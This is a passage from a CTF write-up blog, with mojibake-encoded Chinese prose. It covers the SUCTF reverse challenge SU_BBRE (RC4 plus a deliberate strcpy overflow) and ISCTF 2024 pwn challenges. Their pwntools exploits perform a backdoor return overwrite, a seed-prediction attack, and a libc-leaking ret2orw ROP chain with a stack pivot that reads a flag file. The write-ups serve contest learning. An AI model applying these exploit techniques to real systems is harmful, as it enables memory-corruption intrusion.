exit()<br></code></pre></td></tr></table></figure><img src="/post/23605/1736869382156-70907f03-3004-44ce-b4c8-f2998e754217.png" class="" title="img"><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="SU-BBRE"><a href="#SU-BBRE" class="headerlink" title="SU_BBRE"></a>SU_BBRE</h3><p>ä½¿ç”¨ ai è¿˜åŸä¸º Cè¯­è¨€ä»£ç ï¼ˆåšçš„æ—¶å€™æ²¡æƒ³åˆ°è¿˜åŸ Cï¼Œè·‘å‡ºæ¥ç¬¬ä¸€éƒ¨åˆ†è·Ÿç¬¬ä¸‰éƒ¨åˆ†ï¼Œæ²¡æ„è¯†åˆ°ç¼ºäº†ç¬¬äºŒéƒ¨åˆ†ï¼‰</p><p>main å‡½æ•°è°ƒç”¨ function2 å‡½æ•°è¿›è¡ŒåŠ å¯†ï¼Œå®é™…ä¸Šæ˜¯è¿›è¡Œ rc4 åŠ å¯†å¹¶ä¸”å¯¹æ¯”äº† 16 ä¸ªå­—ç¬¦ï¼›ä¹‹åè°ƒç”¨äº† function0 å‡½æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬çœ‹åˆ° function1 å‡½æ•°ä¸­ä¹Ÿæœ‰å¯¹æ¯”çš„äº†é€»è¾‘ï¼Œå®é™…ä¸Šæ˜¯é€šè¿‡ strcpy æ¥æº¢å‡ºï¼Œä»è€Œè¿›å…¥äº† function1 ä¸­ï¼Œfunction1 å‡½æ•°è¿›è¡Œä¸€ä¸ªç®€å•çš„è¾“å…¥æ¯”å¯¹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-comment">// Function declarations</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">function0</span><span class="hljs-params">(<span class="hljs-type">char</span> *src)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">function1</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">function2</span><span class="hljs-params">(<span class="hljs-type">char</span> *input)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">function3</span><span class="hljs-params">(<span class="hljs-type">char</span> *key, <span class="hljs-type">int</span> key_len, <span class="hljs-type">char</span> *s_box)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">function4</span><span class="hljs-params">(<span class="hljs-type">char</span> *s_box, <span class="hljs-type">char</span> *input, <span class="hljs-type">int</span> input_len)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">function5</span><span class="hljs-params">(<span class="hljs-type">char</span> *key, <span class="hljs-type">int</span> key_len, <span class="hljs-type">char</span> *input, <span class="hljs-type">int</span> input_len)</span>;<br><br><span class="hljs-comment">// Main function</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span> &#123;<br>    <span class="hljs-type">char</span> src[<span class="hljs-number">100</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;please input your flag:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%19s&quot;</span>, src);<br><br>    function2(src);<br>    function0(src);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// Function0: Copies the input string to a destination buffer</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">function0</span><span class="hljs-params">(<span class="hljs-type">char</span> *src)</span> &#123;<br>    <span class="hljs-type">char</span> dest[<span class="hljs-number">4</span>];<br>    <span class="hljs-built_in">strcpy</span>(dest, src);<br>&#125;<br><br><span class="hljs-comment">// Function1: Checks the input against a hardcoded string</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">function1</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// Hardcoded byte array for comparison</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> expected_bytes[] = &#123;<br>        <span class="hljs-number">0x41</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x4D</span>,<br>        <span class="hljs-number">0x53</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x29</span>,<br>        <span class="hljs-number">0x28</span><br>    &#125;;<br><br>    <span class="hljs-comment">// Buffer to store user input</span><br>    <span class="hljs-type">char</span> user_input[<span class="hljs-number">9</span>]; <span class="hljs-comment">// 8 characters + 1 for null terminator</span><br><br>    <span class="hljs-comment">// Prompt the user for input</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;hhh,you find me:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, user_input); <span class="hljs-comment">// Read up to 8 characters to avoid buffer overflow</span><br><br>    <span class="hljs-comment">// Check if the input matches the expected bytes</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">9</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((user_input[i] - i) != expected_bytes[i]) &#123;<br>            <span class="hljs-comment">// If any byte doesn&#x27;t match, exit the program</span><br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// If all bytes match, print success message and exit</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;congratulate!!!&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">// Function2: Checks the input against a hardcoded byte array</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">function2</span><span class="hljs-params">(<span class="hljs-type">char</span> *input)</span> &#123;<br>    <span class="hljs-comment">// Hardcoded byte array for comparison</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> expected_bytes[] = &#123;<br>        <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x65</span>,  <span class="hljs-comment">// &quot;/ZWe&quot;</span><br>        <span class="hljs-number">0x14</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xCD</span>,  <span class="hljs-comment">// Some bytes</span><br>        <span class="hljs-number">0x93</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x55</span>,  <span class="hljs-comment">// Some bytes</span><br>        <span class="hljs-number">0x18</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x5E</span>   <span class="hljs-comment">// Some bytes</span><br>    &#125;;<br><br>    <span class="hljs-comment">// Call function5 to process the input</span><br>    function5(<span class="hljs-string">&quot;suctf&quot;</span>, <span class="hljs-number">5</span>, input, <span class="hljs-number">16</span>);<br><br>    <span class="hljs-comment">// Compare the processed input with the expected bytes</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((input[i]&amp;<span class="hljs-number">0xff</span>) != expected_bytes[i]) &#123;<br>            <span class="hljs-comment">// If any byte doesn&#x27;t match, exit the program</span><br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Function3: Initializes the S-box</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">function3</span><span class="hljs-params">(<span class="hljs-type">char</span> *key, <span class="hljs-type">int</span> key_len, <span class="hljs-type">char</span> *s_box)</span> &#123;<br>    <span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">255</span>; i++) &#123;<br>        s_box[i] = i;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">255</span>; i++) &#123;<br>        j = (j + s_box[i] + key[i % key_len]) % <span class="hljs-number">256</span>;<br>        <span class="hljs-type">char</span> temp = s_box[i];<br>        s_box[i] = s_box[j];<br>        s_box[j] = temp;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Function4: Encrypts the input using the S-box</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">function4</span><span class="hljs-params">(<span class="hljs-type">char</span> *s_box, <span class="hljs-type">char</span> *input, <span class="hljs-type">int</span> input_len)</span> &#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; input_len; k++) &#123;<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>        j = (j + s_box[i]) % <span class="hljs-number">256</span>;<br>        <span class="hljs-type">char</span> temp = s_box[i];<br>        s_box[i] = s_box[j];<br>        s_box[j] = temp;<br>        input[k] ^= s_box[(s_box[i] + s_box[j]) % <span class="hljs-number">256</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Function5: Combines function3 and function4</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">function5</span><span class="hljs-params">(<span class="hljs-type">char</span> *key, <span class="hljs-type">int</span> key_len, <span class="hljs-type">char</span> *input, <span class="hljs-type">int</span> input_len)</span> &#123;<br>    <span class="hljs-type">char</span> s_box[<span class="hljs-number">256</span>];<br>    function3(key, key_len, s_box);<br>    function4(s_box, input, input_len);<br>&#125;<br></code></pre></td></tr></table></figure><p>rc4 å¯ä»¥ç›´æ¥è§£å¯†ï¼Œkey æ˜¯ suctf</p><img src="/post/23605/1736845439618-039851d4-1075-4ba4-9907-441a09d14e6a.png" class="" title="img"><p>å°† function1çš„åœ°å€40223D æŒ‰ç…§å°ç«¯åºè½¬æˆ ASCII ç çš„å“åº”å­—ç¬¦</p><img src="/post/23605/1736845738753-7d0a754a-1d49-43f3-9182-022971232d98.png" class="" title="img"><p>æœ€åæ˜¯ function1 å‡½æ•°æŠŠ flag æŒ‰ä¸‹æ ‡åŠ å›æ¥å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">var_1F = [<span class="hljs-number">0x41</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x28</span>]<br><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(var_1F)):<br>    flag += <span class="hljs-built_in">chr</span>(var_1F[i] + i)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Part 3:&#x27;</span>, flag)<br><span class="hljs-comment">#Part 3: AndPWNT00</span><br></code></pre></td></tr></table></figure><p>suctf{We1com3ToReWorld&#x3D;â€@AndPWNT00}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ISCTF 2024</title>
    <link href="/post/35326.html"/>
    <url>/post/35326.html</url>
    
    <content type="html"><![CDATA[<p>è¿™æ˜¯2024å¹´11æœˆä»½çš„ä¸€åœºæ–°ç”Ÿèµ›ï¼ŒPwné¢˜çš„è´¨é‡è¿˜ä¸é”™ï¼Œå­¦åˆ°äº†ä¸€äº›ä¸œè¥¿ã€‚</p><h1 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h1><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h3><p>nc ç­¾åˆ°</p><img src="/post/35326/1735357331995-8e7ede3e-7ad6-4ea2-801e-d259dcaecadb.png" class="" title="img"><h3 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h3><p>main å‡½æ•°é‡Œæœ‰æ¯”å¯¹ adminï¼Œè¿˜å‘ç° s1 åœ¨ buf çš„èŒƒå›´å†…ï¼Œå¯ä»¥åœ¨è¾“å…¥çš„æ—¶å€™æ§åˆ¶ s1 ä¸º adminã€‚</p><img src="/post/35326/1735361420818-2decd7be-8486-4d94-9bfb-237a9c41543e.png" class="" title="img"><p>vuln å‡½æ•°å¯ä»¥æ ˆæº¢å‡ºï¼Œfor å¾ªç¯æ€»å…± 8 æ¬¡ï¼Œåœ¨ç¬¬å…«æ¬¡è¾“å…¥æ—¶å¯ä»¥è¦†ç›–è¿”å›åœ°å€ï¼›0-5 æ˜¯æ•°ç»„ v1ï¼Œ6 æ˜¯ rbpï¼Œ7 æ˜¯è¿”å›åœ°å€ï¼›å€¼å¾—ä¸€æçš„æ˜¯ i æ˜¯åœ¨ v1 çš„èŒƒå›´å†…ï¼Œå› æ­¤è¾“å…¥çš„å€¼è¦åˆç†ã€‚</p><img src="/post/35326/1735361439224-fb3c8c3b-b6a4-4b4d-8a55-18b769cff807.png" class="" title="img"><p>æœ‰åé¢å‡½æ•°</p><img src="/post/35326/1735386043390-81a0f68d-b2fa-4c6c-b313-5ef93350775e.png" class="" title="img"><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment"># p = remote(&#x27;gz.imxbt.cn&#x27;, 20665)</span><br><span class="hljs-comment"># p = remote(&#x27;27.25.151.12&#x27;, 30728)</span><br><br>shell = <span class="hljs-number">0x40121B</span><span class="hljs-comment">#4198939</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">0x8</span>) + <span class="hljs-string">b&#x27;admin&#x27;</span><br>p.recvuntil(<span class="hljs-string">&quot;first i need your team id&quot;</span>)<br>p.send(payload)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>payload = <span class="hljs-string">b&#x27;5&#x27;</span><br>p.recvuntil(<span class="hljs-string">&quot;birthday\n&quot;</span>)<br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">&quot;birthday\n&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;4198939&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="ez-game"><a href="#ez-game" class="headerlink" title="ez_game"></a>ez_game</h3><p>è¿™é¢˜æ˜¯ä¸€ä¸ªä¼ªéšæœºæ•°ï¼Œæ€»å…±éœ€è¦è·‘ 20001 æ¬¡ï¼Œæœ€å¼€å§‹çš„æƒ³æ³•æ˜¯æ ˆæº¢å‡ºæ§åˆ¶ seed çš„å€¼ï¼Œä½†æ˜¯åœ¨å¾ªç¯é‡Œé¢æ²¡å¤„ç†å¥½ï¼›åé¢çš„åšæ³•æ˜¯å…ˆè·‘ 20001 æ¬¡éšæœºæ•°å­˜åˆ°åˆ—è¡¨ä¸­ï¼Œç„¶åè¿ä¸Šè¿œç¨‹å‘é€åˆ—è¡¨é‡Œçš„éšæœºæ•°ã€‚</p><img src="/post/35326/1735361023649-7b183176-7e0f-4922-8d54-fbb9d8dae671.png" class="" title="img"><p>è¿™é‡Œæˆ‘ç»™å‡ºäº†ä¸¤ä¸ª expï¼Œç¬¬ä¸€ä¸ªæ˜¯å…ˆè·‘éšæœºæ•°ï¼Œç¬¬äºŒä¸ªæ˜¯æ ˆæº¢å‡ºæ§åˆ¶éšæœºæ•°ã€‚</p><p>exp1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>libc = cdll.LoadLibrary(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>seed = <span class="hljs-number">1</span><br>libc.srand(seed)<br>random = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20001</span>):<br>random.append(libc.rand() % <span class="hljs-number">7</span> + <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&#x27;27.25.151.12&#x27;</span>, <span class="hljs-number">31338</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;Enter your username: &quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> random:<br>p.sendline(<span class="hljs-built_in">str</span>(i))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>exp2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>libc = cdll.LoadLibrary(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment"># p = remote(&quot;gz.imxbt.cn&quot;, 20620)</span><br><br>p.recvuntil(<span class="hljs-string">&quot;Enter your username: &quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x190</span> + p64(<span class="hljs-number">0</span>)<br>p.sendline(payload)<br><br>libc.srand(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20001</span>):<br>res = libc.rand() % <span class="hljs-number">7</span> + <span class="hljs-number">1</span><br>p.sendline(<span class="hljs-built_in">str</span>(res).encode())<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="ret2orw"><a href="#ret2orw" class="headerlink" title="ret2orw"></a>ret2orw</h3><p>vuln å‡½æ•°æœ‰æ ˆæº¢å‡º</p><img src="/post/35326/1731140627397-e6552388-7678-42ed-ac17-acb666d7d18e.png" class="" title="img"><p>å¼€äº†æ²™ç®±ç¦ç”¨ execveï¼Œè€ƒè™‘ä½¿ç”¨ openã€read å’Œ write è¯»å– flagã€‚</p><img src="/post/35326/1731142376487-b5bcb9a6-1143-4f0d-8cc0-5b0eb55b3c77.png" class="" title="img"><p>æˆ‘ä»¬åœ¨ vuln æ³„éœ²å‡º libc ä¹‹åè¿”å›åˆ° main å‡½æ•°ï¼Œç„¶åæ„é€ ä¸€ä¸ªå¤§çš„ readï¼Œå¹¶æ ˆè¿ç§»åˆ° bss æ®µï¼Œæœ€åå¸ƒç½® orw çš„ rop é“¾è¯»å– flagï¼Œè¿™é‡Œæ„é€  read æ˜¯æ‹…å¿ƒ 0x100 å­—èŠ‚ä¸è¶³ä»¥å¸ƒç½® orw çš„ rop é“¾ã€‚</p><p>exp1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment"># p = process(&#x27;./pwn&#x27;)</span><br><span class="hljs-comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;27.25.151.12&#x27;</span>, <span class="hljs-number">25636</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = <span class="hljs-number">0x4012F2</span><br>bss = <span class="hljs-number">0x404060</span>+<span class="hljs-number">0x400</span><br>bss1 = <span class="hljs-number">0x404060</span>+<span class="hljs-number">0x700</span><br>pop_rdi = <span class="hljs-number">0x4012ce</span><br>pop_rbp = <span class="hljs-number">0x4011dd</span><br>leave_ret = <span class="hljs-number">0x40129f</span><br>ret = <span class="hljs-number">0x40101a</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rdi) +p64(puts_got)<br>payload += p64(puts_plt) + p64(main)<br>p.recvuntil(<span class="hljs-string">&quot;oh,what&#x27;s this?\n&quot;</span>)<br>p.sendline(payload)<br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;puts_addr:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(puts_addr)))<br><br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>open_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>pop_rsi = libc_base + <span class="hljs-number">0x16333a</span><br>pop_rdx = libc_base + <span class="hljs-number">0x904a9</span><span class="hljs-comment">#pop rdx; pop rbx; ret;</span><br><br><span class="hljs-comment">#read(0, bss, 0x500)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span><br>payload += p64(pop_rdi)+ p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rsi) + p64(bss)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0x500</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(read_addr)<br>payload += p64(pop_rbp) + p64(bss) + p64(leave_ret)<br>p.recvuntil(<span class="hljs-string">&quot;oh,what&#x27;s this?\n&quot;</span>)<br>p.sendline(payload)<br><br><span class="hljs-comment">#open(bss, 0, 0)</span><br>payload = <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span><br>payload += p64(pop_rdi) + p64(bss)<br>payload += p64(pop_rsi) + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(open_addr)<br>payload += p64(ret)<br><span class="hljs-comment">#read(3, bss1, 0)</span><br>payload += p64(pop_rdi) + p64(<span class="hljs-number">3</span>)<br>payload += p64(pop_rsi) + 